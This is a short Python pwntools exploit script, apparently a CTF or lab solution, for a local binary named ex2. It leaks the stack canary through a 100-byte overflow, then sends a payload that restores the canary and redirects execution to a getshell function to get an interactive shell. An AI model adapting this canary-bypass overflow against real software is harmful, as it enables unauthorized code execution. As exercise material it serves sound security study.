#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
context.log_level = 'debug'
p = process('./ex2')
elf = ELF('./ex2')
getshell = elf.symbols["getshell"]
log.success('getshell = ' + hex(getshell))
# Leak Canary
payload = 'A' * 100
p.sendlineafter('Hello Hacker!\n', payload)
p.recvuntil('A' * 100)
canary = u32(p.recv(4)) - 0xa
log.success('canary = ' + hex(canary))
# Bypass Canary
payload = flat(['\x90' * 100, canary, '\x90' * 12, getshell])
p.send(payload)
p.recv()
p.interactive()
